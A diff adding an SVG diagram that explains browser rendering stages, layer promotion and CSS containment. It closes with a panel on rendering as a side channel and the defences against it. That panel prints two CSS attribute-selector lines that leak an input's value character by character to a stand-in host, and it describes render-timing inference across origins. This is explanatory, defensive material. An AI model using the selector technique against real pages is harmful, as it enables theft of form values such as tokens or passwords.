@@ -1,0 +1,92 @@
+<svg viewBox="0 0 1000 720" xmlns="http://www.w3.org/2000/svg" font-family="Pretendard, -apple-system, 'Segoe UI', sans-serif">
+  <rect x="0" y="0" width="1000" height="720" rx="12" fill="#0a0a14" stroke="#2a2a3e"/>
+  <text x="500" y="34" text-anchor="middle" fill="#e8e8f0" font-size="19" font-weight="700">Change what, and it reruns from where</text>
+  <text x="500" y="56" text-anchor="middle" fill="#8a8aa0" font-size="12">The frame budget is about 16.7ms at 60Hz. Which stage it reruns from decides whether that budget holds.</text>
+
+  <!-- 파이프라인 헤더 -->
+  <g text-anchor="middle" font-size="10.5">
+    <rect x="320" y="80" width="120" height="30" rx="5" fill="#141a22" stroke="#6f9fd8"/>
+    <text x="380" y="100" fill="#bcd6f0">Style</text>
+    <rect x="450" y="80" width="120" height="30" rx="5" fill="#141a22" stroke="#6f9fd8"/>
+    <text x="510" y="100" fill="#bcd6f0">Layout</text>
+    <rect x="580" y="80" width="120" height="30" rx="5" fill="#141a22" stroke="#6f9fd8"/>
+    <text x="640" y="100" fill="#bcd6f0">Paint</text>
+    <rect x="710" y="80" width="120" height="30" rx="5" fill="#12201c" stroke="#34d399"/>
+    <text x="770" y="100" fill="#a7f3d0">Composite</text>
+  </g>
+
+  <!-- 행들 -->
+  <g font-size="10.5">
+    <rect x="40" y="120" width="920" height="34" rx="5" fill="#12121f" stroke="#3a3a52"/>
+    <text x="58" y="142" fill="#c8c8d8">width · height · font-size · display</text>
+    <text x="380" y="142" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="510" y="142" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="640" y="142" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="770" y="142" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="870" y="142" fill="#8a8aa0">most expensive</text>
+
+    <rect x="40" y="162" width="920" height="34" rx="5" fill="#12121f" stroke="#3a3a52"/>
+    <text x="58" y="184" fill="#c8c8d8">color · background-color · box-shadow</text>
+    <text x="380" y="184" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="510" y="184" text-anchor="middle" fill="#34d399">skipped</text>
+    <text x="640" y="184" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="770" y="184" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="870" y="184" fill="#8a8aa0">geometry unchanged</text>
+
+    <rect x="40" y="204" width="920" height="34" rx="5" fill="#12201c" stroke="#34d399"/>
+    <text x="58" y="226" fill="#a7f3d0">transform · opacity (on a promoted layer)</text>
+    <text x="380" y="226" text-anchor="middle" fill="#34d399">skipped</text>
+    <text x="510" y="226" text-anchor="middle" fill="#34d399">skipped</text>
+    <text x="640" y="226" text-anchor="middle" fill="#34d399">skipped</text>
+    <text x="770" y="226" text-anchor="middle" fill="#db8585" font-weight="600">rerun</text>
+    <text x="870" y="226" fill="#a7f3d0">cheapest</text>
+
+    <rect x="40" y="246" width="920" height="34" rx="5" fill="#1f1a12" stroke="#e6a572"/>
+    <text x="58" y="268" fill="#f0cba8">reading offsetHeight · getBoundingClientRect()</text>
+    <text x="510" y="268" text-anchor="middle" fill="#e6a572" font-weight="600">runs immediately, on the spot</text>
+    <text x="800" y="268" fill="#8a8aa0">does not wait for the frame's end</text>
+  </g>
+
+  <!-- 레이어 승격 -->
+  <rect x="40" y="300" width="450" height="170" rx="10" fill="#12121f" stroke="#3a3a52"/>
+  <text x="60" y="324" fill="#e8e8f0" font-size="12" font-weight="700">Layer promotion is not free</text>
+  <text x="60" y="346" fill="#c8c8d8" font-size="10.5">Made a separate layer, the element is rasterized independently</text>
+  <text x="60" y="362" fill="#c8c8d8" font-size="10.5">and moving it needs only recompositing.</text>
+  <text x="60" y="386" fill="#e6a572" font-size="10.5" font-weight="600">The price</text>
+  <text x="60" y="404" fill="#8a8aa0" font-size="10.5">· each layer uses its own GPU memory</text>
+  <text x="60" y="422" fill="#8a8aa0" font-size="10.5">· with many layers, compositing itself becomes the bottleneck</text>
+  <text x="60" y="440" fill="#8a8aa0" font-size="10.5">· scattering will-change globally makes memory spike</text>
+  <text x="60" y="460" fill="#c8c8d8" font-size="10.5">The principle is to turn it on only while needed and off when done.</text>
+
+  <!-- containment -->
+  <rect x="510" y="300" width="450" height="170" rx="10" fill="#12121f" stroke="#3a3a52"/>
+  <text x="530" y="324" fill="#e8e8f0" font-size="12" font-weight="700">Declarations that narrow invalidation</text>
+  <text x="530" y="346" fill="#c8c8d8" font-size="10.5">By default one element's size change propagates to siblings</text>
+  <text x="530" y="362" fill="#c8c8d8" font-size="10.5">and ancestors. So one list item changing shakes the whole thing.</text>
+  <text x="530" y="386" fill="#a7f3d0" font-size="10.5" font-weight="600">contain – declares changes inside do not affect the outside</text>
+  <text x="530" y="406" fill="#8a8aa0" font-size="10.5">The browser believes that promise and confines recomputation to the subtree</text>
+  <text x="530" y="428" fill="#a7f3d0" font-size="10.5" font-weight="600">content-visibility – skips rendering of off-screen content</text>
+  <text x="530" y="448" fill="#8a8aa0" font-size="10.5">Large gains on long lists, and the render cost difference becomes observable</text>
+  <text x="530" y="464" fill="#8a8aa0" font-size="10.5">– the point connecting to the information channel below</text>
+
+  <!-- 정보 채널 -->
+  <rect x="40" y="486" width="920" height="216" rx="10" fill="#1a1420" stroke="#db8fb4"/>
+  <text x="60" y="510" fill="#f0c0d8" font-size="12.5" font-weight="700">Rendering is an information channel – values leak with no script inserted</text>
+
+  <rect x="60" y="524" width="430" height="80" rx="7" fill="#1a1012" stroke="#db8585"/>
+  <text x="78" y="544" fill="#e8b0b0" font-size="11" font-weight="600">Extracting a value one character at a time with CSS alone</text>
+  <text x="78" y="562" font-family="Menlo, monospace" font-size="10" fill="#c8c8d8">input[value^="a"] { background: url(//x/?a) }</text>
+  <text x="78" y="578" font-family="Menlo, monospace" font-size="10" fill="#c8c8d8">input[value^="b"] { background: url(//x/?b) }</text>
+  <text x="78" y="596" fill="#8a8aa0" font-size="10">only the matching rule sends a request → first character settled → next character</text>
+
+  <rect x="510" y="524" width="430" height="80" rx="7" fill="#1a1012" stroke="#db8585"/>
+  <text x="528" y="544" fill="#e8b0b0" font-size="11" font-weight="600">Inferring state from differences in render cost</text>
+  <text x="528" y="562" fill="#c8c8d8" font-size="10">Put another origin's page in a frame and measure how long it takes to draw.</text>
+  <text x="528" y="580" fill="#c8c8d8" font-size="10">If render cost differs by login state or whether results exist,</text>
+  <text x="528" y="596" fill="#c8c8d8" font-size="10">the state can be told apart without reading the response.</text>
+
+  <text x="60" y="632" fill="#c8c8d8" font-size="10.5">Why defence is hard – these channels are byproducts of features, not bugs. Selectors have to match, and rendering costs differ by content.</text>
+  <text x="60" y="654" fill="#8a8aa0" font-size="10.5">So defences are mostly indirect. Restrict external resource loading with CSP, keep sensitive values out of DOM attributes,</text>
+  <text x="60" y="672" fill="#8a8aa0" font-size="10.5">refuse framing (frame-ancestors), and reduce the render cost difference between states.</text>
+  <text x="60" y="692" fill="#f0c0d8" font-size="10.5" font-weight="600">Blocking reads and removing differences in response are different jobs. Not doing the latter separately leaves it behind.</text>
+</svg>
